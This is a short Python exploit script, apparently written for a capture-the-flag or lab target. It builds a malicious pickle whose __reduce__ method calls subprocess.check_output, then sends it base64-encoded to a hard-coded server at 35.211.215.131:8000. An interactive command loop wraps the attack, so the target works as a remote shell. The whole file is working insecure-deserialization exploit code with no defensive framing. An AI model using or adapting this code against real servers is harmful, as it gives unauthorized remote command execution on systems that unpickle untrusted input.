import pickle
import base64
import subprocess
import requests
import cmd

class MyCmd(cmd.Cmd):
    prompt = 'Sauekraut >'

    def default(self, arg):
        #print("Amit Agarwal -> " +arg)
        args = arg.split()
        pickled = pickle.dumps(RCE(args))
        proxies={'http':'http://localhost:8080'}
        headers={"Content-Type":	"application/x-www-form-urlencoded"}
        r = requests.post('http://35.211.215.131:8000/',
        data=f'text={base64.urlsafe_b64encode(pickled).decode()}',proxies=proxies,
        headers=headers)
        print(r.text)


class RCE:
    def __init__(self,arg):
        self.arg = arg
    def __reduce__(self):
        cmd = (self.arg)
        return subprocess.check_output, (cmd,)


if __name__ == '__main__':
      MyCmd().cmdloop()
#     pickled = pickle.dumps(RCE())
#     print(base64.urlsafe_b64encode(pickled))
#     proxies={'http':'http://localhost:8080'}
#     headers={"Content-Type":	"application/x-www-form-urlencoded"}
#     r = requests.post('http://35.211.215.131:8000/',
#     data=f'text={base64.urlsafe_b64encode(pickled).decode()}',proxies=proxies,
#     headers=headers)
#    print(r.text)
